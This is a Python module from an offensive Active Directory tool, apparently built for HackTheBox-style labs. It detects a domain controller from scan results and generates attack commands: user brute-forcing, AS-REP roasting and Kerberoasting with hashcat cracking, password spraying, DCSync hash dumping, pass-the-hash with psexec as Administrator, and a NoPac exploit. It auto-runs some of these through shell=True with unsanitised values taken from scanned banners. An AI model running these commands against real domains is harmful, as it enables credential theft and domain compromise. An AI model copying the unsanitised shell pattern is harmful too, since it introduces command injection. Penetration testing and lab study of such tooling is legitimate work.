"""
ChocoScan — Active Directory Enumeration.

Détecte le contexte AD depuis le scan réseau, génère les commandes
impacket/ldapsearch pré-remplies et les exécute automatiquement
si --ad-auto est activé.

Couvre :
  - Détection du domaine et du DC
  - User enumeration (kerbrute, enum4linux-ng)
  - AS-REP Roasting (GetNPUsers)
  - Kerberoasting (GetUserSPNs)
  - LDAP enumeration (ldapsearch, ldapdomaindump)
  - BloodHound collection (bloodhound-python)
  - SMB shares enumeration
  - DC sync check (si creds valides)

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

import json
import re
import subprocess
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class ADInfo:
    dc_ip:      str
    domain:     str        # ex: htb.local
    domain_nb:  str        # NetBIOS ex: HTB
    hostname:   str = ""
    os:         str = ""
    signing:    bool = True


@dataclass
class ADCommand:
    title:       str
    description: str
    command:     str
    requires:    list[str] = field(default_factory=list)  # outils requis
    output_file: str = ""


@dataclass
class ADResult:
    ad_info:      ADInfo
    commands:     list[ADCommand]
    auto_results: dict[str, str] = field(default_factory=dict)  # cmd -> output si --ad-auto


# ── Détection du contexte AD ─────────────────────────────────────────────────

def detect_ad_context(results: list[dict]) -> ADInfo | None:
    """
    Tente de détecter un contexte Active Directory depuis les résultats de scan.
    Retourne None si aucun indicateur AD n'est trouvé.
    """
    dc_ip    = ""
    domain   = ""
    domain_nb= ""
    hostname = ""
    os_info  = ""

    for result in results:
        svc    = result.get("service", {})
        port   = svc.get("port", 0)
        banner = svc.get("banner", "").lower()
        svc_name = svc.get("service_name", "").lower()
        host   = svc.get("host", "")

        # LDAP → domaine
        if port in (389, 636, 3268, 3269) or "ldap" in svc_name:
            dc_ip = host
            # Banner Nmap LDAP contient souvent le domaine
            m = re.search(r"dc=([^,]+)", banner, re.IGNORECASE)
            if m:
                parts = re.findall(r"dc=([^,\s]+)", banner, re.IGNORECASE)
                domain = ".".join(parts) if parts else m.group(1)

        # Kerberos
        if port == 88 or "kerberos" in svc_name:
            dc_ip = host

        # SMB → domaine + hostname
        if port in (139, 445) or "smb" in svc_name or "netbios" in svc_name:
            if not dc_ip:
                dc_ip = host
            m_os = re.search(r"windows ([^\s]+)", banner, re.IGNORECASE)
            if m_os:
                os_info = m_os.group(0)
            m_dom = re.search(r"domain[:\s]+([a-zA-Z0-9_.-]+)", banner, re.IGNORECASE)
            if m_dom:
                domain_nb = m_dom.group(1).upper()
            m_host = re.search(r"computer[:\s]+([a-zA-Z0-9_.-]+)", banner, re.IGNORECASE)
            if m_host:
                hostname = m_host.group(1)

        # RPC
        if port == 135 or "msrpc" in svc_name:
            if not dc_ip:
                dc_ip = host

        # DNS Windows → domaine
        if port == 53 and "microsoft" in banner:
            if not dc_ip:
                dc_ip = host

    # Si aucun indicateur fort, pas de contexte AD
    ad_ports = {88, 389, 636, 3268, 3269}
    detected_ports = {
        r.get("service", {}).get("port", 0)
        for r in results
    }
    if not (ad_ports & detected_ports) and not dc_ip:
        return None

    if not dc_ip:
        # Fallback : premier host du scan
        for result in results:
            svc = result.get("service", {})
            if svc.get("host"):
                dc_ip = svc["host"]
                break

    if not domain:
        domain = "DOMAIN.LOCAL"
    if not domain_nb:
        domain_nb = domain.split(".")[0].upper()

    return ADInfo(
        dc_ip=dc_ip,
        domain=domain,
        domain_nb=domain_nb,
        hostname=hostname,
        os=os_info,
    )


# ── Génération des commandes AD ───────────────────────────────────────────────

def build_ad_commands(ad: ADInfo, output_dir: str = "output",
                       username: str = "", password: str = "") -> list[ADCommand]:
    """
    Génère la liste complète des commandes AD pré-remplies.
    """
    D  = ad.domain
    DC = ad.dc_ip
    NB = ad.domain_nb
    OUT = output_dir
    creds = f"{NB}/{username}:{password}" if username and password else f"{NB}/<user>:<pass>"
    anonymous = "-U '' -N" if not username else f"-U '{NB}\\\\{username}%{password}'"

    commands: list[ADCommand] = []

    # ── 1. Énumération anonyme / null session ─────────────────────────────────
    commands.append(ADCommand(
        title="Énumération SMB — null session",
        description="Tente une session nulle pour énumérer users, partages, groupes.",
        command=(
            f"enum4linux-ng -A {DC} 2>/dev/null | tee {OUT}/enum4linux_{DC}.txt\n"
            f"# ou avec enum4linux classique :\n"
            f"enum4linux -a {DC} 2>/dev/null | tee {OUT}/enum4linux_classic_{DC}.txt"
        ),
        requires=["enum4linux-ng"],
        output_file=f"{OUT}/enum4linux_{DC}.txt",
    ))

    commands.append(ADCommand(
        title="Partages SMB accessibles",
        description="Liste les partages SMB accessibles (null session et avec creds).",
        command=(
            f"smbclient -L //{DC} -N 2>/dev/null\n"
            f"smbmap -H {DC} -u '' -p '' 2>/dev/null\n"
            f"crackmapexec smb {DC} --shares 2>/dev/null"
        ),
        requires=["smbclient", "smbmap"],
    ))

    # ── 2. Enumération utilisateurs ──────────────────────────────────────────
    commands.append(ADCommand(
        title="Kerbrute — Énumération utilisateurs",
        description="Bruteforce des noms d'utilisateurs valides sans mot de passe (ASREP pré-auth).",
        command=(
            f"kerbrute userenum --dc {DC} --domain {D} "
            f"/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt "
            f"-o {OUT}/kerbrute_users_{DC}.txt 2>/dev/null"
        ),
        requires=["kerbrute"],
        output_file=f"{OUT}/kerbrute_users_{DC}.txt",
    ))

    commands.append(ADCommand(
        title="RID Cycling — Énumération utilisateurs",
        description="Énumère les SID via RID cycling (nécessite une session nulle ou guest).",
        command=(
            f"impacket-lookupsid {NB}/guest@{DC} 0-2000 2>/dev/null "
            f"| grep -i 'sidtypeuser\\|sidtypegroup' "
            f"| tee {OUT}/rid_cycling_{DC}.txt"
        ),
        requires=["impacket-lookupsid"],
        output_file=f"{OUT}/rid_cycling_{DC}.txt",
    ))

    # ── 3. AS-REP Roasting ────────────────────────────────────────────────────
    commands.append(ADCommand(
        title="AS-REP Roasting — GetNPUsers",
        description=(
            "Récupère les hashes AS-REP des comptes sans pré-authentification Kerberos. "
            "Les hashes peuvent être craqués offline avec hashcat."
        ),
        command=(
            f"# Sans liste d'utilisateurs (si null session disponible) :\n"
            f"impacket-GetNPUsers {D}/ -dc-ip {DC} -no-pass -usersfile /usr/share/seclists/Usernames/cirt-default-usernames.txt "
            f"-format hashcat -outputfile {OUT}/asrep_hashes_{DC}.txt 2>/dev/null\n\n"
            f"# Avec liste d'utilisateurs kerbrute :\n"
            f"impacket-GetNPUsers {D}/ -dc-ip {DC} -no-pass "
            f"-usersfile {OUT}/kerbrute_users_{DC}.txt "
            f"-format hashcat -outputfile {OUT}/asrep_hashes_{DC}.txt 2>/dev/null\n\n"
            f"# Crack avec hashcat :\n"
            f"hashcat -m 18200 {OUT}/asrep_hashes_{DC}.txt /usr/share/wordlists/rockyou.txt --force"
        ),
        requires=["impacket-GetNPUsers", "hashcat"],
        output_file=f"{OUT}/asrep_hashes_{DC}.txt",
    ))

    # ── 4. Kerberoasting ──────────────────────────────────────────────────────
    commands.append(ADCommand(
        title="Kerberoasting — GetUserSPNs",
        description=(
            "Récupère les tickets TGS des comptes service (SPN). "
            "Nécessite des credentials valides. Les hashes sont crackables offline."
        ),
        command=(
            f"# Lister les SPNs :\n"
            f"impacket-GetUserSPNs {creds} -dc-ip {DC} 2>/dev/null\n\n"
            f"# Récupérer les tickets TGS :\n"
            f"impacket-GetUserSPNs {creds} -dc-ip {DC} "
            f"-request -outputfile {OUT}/kerberoast_hashes_{DC}.txt 2>/dev/null\n\n"
            f"# Crack avec hashcat :\n"
            f"hashcat -m 13100 {OUT}/kerberoast_hashes_{DC}.txt "
            f"/usr/share/wordlists/rockyou.txt --force"
        ),
        requires=["impacket-GetUserSPNs", "hashcat"],
        output_file=f"{OUT}/kerberoast_hashes_{DC}.txt",
    ))

    # ── 5. LDAP Enumeration ───────────────────────────────────────────────────
    commands.append(ADCommand(
        title="LDAP — Enumération anonyme",
        description="Énumère le domaine via LDAP sans authentification.",
        command=(
            f"ldapsearch -x -H ldap://{DC} -b 'dc={D.replace('.', ',dc=')}' "
            f"'(objectClass=*)' 2>/dev/null | head -100\n\n"
            f"# Tous les utilisateurs :\n"
            f"ldapsearch -x -H ldap://{DC} -b 'dc={D.replace('.', ',dc=')}' "
            f"'(objectClass=person)' sAMAccountName 2>/dev/null\n\n"
            f"# Policy de mots de passe :\n"
            f"ldapsearch -x -H ldap://{DC} -b 'dc={D.replace('.', ',dc=')}' "
            f"'(objectClass=domainDNS)' lockoutThreshold minPwdLength 2>/dev/null"
        ),
        requires=["ldapsearch"],
    ))

    commands.append(ADCommand(
        title="ldapdomaindump — Dump complet du domaine",
        description="Dump complet du domaine AD en JSON/HTML.",
        command=(
            f"ldapdomaindump {DC} -u '{D}\\\\{username or 'user'}' "
            f"-p '{password or 'pass'}' "
            f"--no-json --no-grep -o {OUT}/ldap_dump_{DC}/ 2>/dev/null"
        ),
        requires=["ldapdomaindump"],
        output_file=f"{OUT}/ldap_dump_{DC}/",
    ))

    # ── 6. BloodHound ─────────────────────────────────────────────────────────
    commands.append(ADCommand(
        title="BloodHound — Collecte des chemins d'attaque",
        description="Collecte toutes les relations AD pour analyse dans BloodHound CE.",
        command=(
            f"bloodhound-python -c All -u '{username or 'user'}' "
            f"-p '{password or 'pass'}' "
            f"-d {D} -dc {DC} --dns-tcp -ns {DC} "
            f"-o {OUT}/bloodhound_{DC}/ 2>/dev/null\n\n"
            f"# Puis importer dans BloodHound CE :\n"
            f"# 1. Démarrer BloodHound CE (docker ou local)\n"
            f"# 2. Importer les fichiers JSON depuis {OUT}/bloodhound_{DC}/"
        ),
        requires=["bloodhound-python"],
        output_file=f"{OUT}/bloodhound_{DC}/",
    ))

    # ── 7. Pass-the-Hash / Spray ──────────────────────────────────────────────
    commands.append(ADCommand(
        title="CrackMapExec — Password spray",
        description="Teste un mot de passe sur tous les hosts du réseau (attention au verrouillage).",
        command=(
            f"crackmapexec smb {DC} -u {OUT}/kerbrute_users_{DC}.txt "
            f"-p 'Password123!' --continue-on-success 2>/dev/null\n\n"
            f"# Avec creds valides — vérifier si admin :\n"
            f"crackmapexec smb {DC} -u '{username or 'user'}' -p '{password or 'pass'}' "
            f"--shares --sessions 2>/dev/null"
        ),
        requires=["crackmapexec"],
    ))

    # ── 8. Vérification des attaques classiques HTB ───────────────────────────
    commands.append(ADCommand(
        title="DCSync — Dump des hashes (si droits suffisants)",
        description="Dump tous les hashes du domaine si le compte a les droits DCSync (Domain Admins / Replication).",
        command=(
            f"impacket-secretsdump {creds}@{DC} -dc-ip {DC} 2>/dev/null "
            f"| tee {OUT}/secretsdump_{DC}.txt\n\n"
            f"# Pass-the-Hash avec le hash admin :\n"
            f"impacket-psexec {NB}/Administrator@{DC} -hashes :<NTLM_HASH> 2>/dev/null"
        ),
        requires=["impacket-secretsdump"],
        output_file=f"{OUT}/secretsdump_{DC}.txt",
    ))

    commands.append(ADCommand(
        title="Zerologon / NoPac / PrintNightmare",
        description="Vérification des vulnérabilités critiques AD classiques HTB.",
        command=(
            f"# Zerologon (CVE-2020-1472) :\n"
            f"impacket-rpcdump {DC} | grep -i 'protocol.*netlogon' 2>/dev/null\n\n"
            f"# NoPac (CVE-2021-42278 + CVE-2021-42287) :\n"
            f"noPac.py {D}/{username or 'user'}:{password or 'pass'} -dc-ip {DC} --impersonate Administrator 2>/dev/null\n\n"
            f"# Vérifier SMB signing :\n"
            f"crackmapexec smb {DC} --gen-relay-list {OUT}/relay_targets.txt 2>/dev/null"
        ),
    ))

    return commands


# ── Exécution automatique (--ad-auto) ─────────────────────────────────────────

def _tool_available(tool: str) -> bool:
    """Vérifie si un outil est disponible dans le PATH."""
    import shutil
    return shutil.which(tool) is not None


def run_ad_auto(ad: ADInfo, output_dir: str = "output") -> dict[str, str]:
    """
    Exécute automatiquement les commandes AD sûres (sans bruteforce/destruction).
    Retourne un dict {titre: output}.
    """
    results: dict[str, str] = {}
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    DC = ad.dc_ip

    safe_auto = [
        # Énumération sans credentials, non destructive
        ("smbclient null",      ["smbclient"],       f"smbclient -L //{DC} -N -g 2>/dev/null"),
        ("smbmap anonymous",    ["smbmap"],          f"smbmap -H {DC} -u '' -p '' 2>/dev/null"),
        ("crackmapexec smb",    ["crackmapexec", "cme"], f"crackmapexec smb {DC} 2>/dev/null"),
        ("LDAP anonymous",      ["ldapsearch"],
         f"ldapsearch -x -H ldap://{DC} -b '' -s base namingContexts 2>/dev/null"),
        ("AS-REP scan",         ["impacket-GetNPUsers"],
         f"impacket-GetNPUsers {ad.domain}/ -dc-ip {DC} -no-pass "
         f"-usersfile /usr/share/seclists/Usernames/cirt-default-usernames.txt "
         f"-format hashcat 2>/dev/null | grep '\\$krb5asrep'"),
        ("enum4linux-ng",       ["enum4linux-ng"],   f"enum4linux-ng -A {DC} 2>/dev/null"),
    ]

    for title, tools, cmd in safe_auto:
        available = any(_tool_available(t) for t in tools)
        if not available:
            results[title] = f"[!] Outil non disponible : {', '.join(tools)}"
            continue
        try:
            proc = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=30
            )
            output = proc.stdout.strip() or proc.stderr.strip() or "(pas de résultat)"
            results[title] = output[:2000]
        except subprocess.TimeoutExpired:
            results[title] = "[!] Timeout (30s)"
        except Exception as e:
            results[title] = f"[!] Erreur : {e}"

    return results


# ── Point d'entrée ────────────────────────────────────────────────────────────

def analyze_ad(results: list[dict], output_dir: str = "output",
               auto: bool = False, username: str = "",
               password: str = "") -> ADResult | None:
    """
    Détecte le contexte AD depuis les résultats de scan,
    génère les commandes et optionnellement les exécute.
    """
    ad = detect_ad_context(results)
    if not ad:
        return None

    commands = build_ad_commands(ad, output_dir, username, password)
    auto_results = run_ad_auto(ad, output_dir) if auto else {}

    return ADResult(ad_info=ad, commands=commands, auto_results=auto_results)
